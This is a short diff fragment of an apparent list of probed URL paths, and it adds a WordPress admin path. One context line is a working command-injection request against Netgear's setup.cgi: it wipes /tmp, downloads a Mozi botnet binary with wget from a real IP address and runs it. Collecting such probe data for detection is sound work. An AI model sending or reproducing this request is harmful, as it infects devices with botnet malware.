@@ -4151,3 +4151,4 @@ www.liveinternet.ru:443
 /wp-content/plugins/custom-registration-form-builder-with-submission-manager/readme.txt
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.117.30.240:46272/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /global-protect/login.esp
+/index.php/wp-admin/
